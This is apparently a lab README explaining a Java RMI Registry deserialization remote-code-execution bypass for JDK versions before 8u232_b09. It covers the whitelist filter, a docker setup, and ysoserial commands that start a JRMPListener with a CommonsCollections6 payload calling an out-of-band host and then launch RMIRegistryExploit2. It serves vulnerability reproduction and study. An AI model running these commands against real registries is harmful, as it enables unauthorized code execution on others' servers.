# Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass

[中文版本(Chinese version)](README.zh-cn.md)

Java Remote Method Invocation (RMI) is used for remote procedure calls in Java. Although remote binding is typically disabled, RMI Registry contains a remote binding functionality that can be exploited. By forging serialized data (implementing the Remote interface or dynamically proxying objects that implement the Remote interface) during the binding process, an attacker can trigger a deserialization vulnerability in the Registry when it processes the data.

Since JDK 8u121, the Registry implements a whitelist restriction for deserialized classes:

```java
if (String.class == clazz
        || java.lang.Number.class.isAssignableFrom(clazz)
        || Remote.class.isAssignableFrom(clazz)
        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
        || UnicastRef.class.isAssignableFrom(clazz)
        || RMIClientSocketFactory.class.isAssignableFrom(clazz)
        || RMIServerSocketFactory.class.isAssignableFrom(clazz)
        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
        || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
    return ObjectInputFilter.Status.ALLOWED;
} else {
    return ObjectInputFilter.Status.REJECTED;
}
```

We need to find exploitable classes within these whitelisted classes. For more details, see [A Discussion on RMI Registry Deserialization Issues](https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/), this article introduces the bypass methods that use JRMPListener to bypass the whitelist restriction.

References:

- <https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/>
- <https://github.com/wh1t3p1g/ysoserial>

## Environment Setup

Execute the following commands to compile and start the RMI Registry and server:

```
docker compose build
docker compose run -e RMIIP=your-ip -p 1099:1099 rmi
```

Replace `your-ip` with your server's IP address. The client will use this IP to connect to the server.

After startup, the RMI Registry will be listening on port 1099.

## Vulnerability Reproduction

Use RMIRegistryExploit2 or RMIRegistryExploit3 from [ysoserial](https://github.com/wh1t3p1g/ysoserial)'s exploit package to perform the attack:

```bash
# Start JRMPListener
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
# Launch the attack
java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888
```

![](1.png)

The Registry will return an error, but this is normal and the command will still execute successfully.
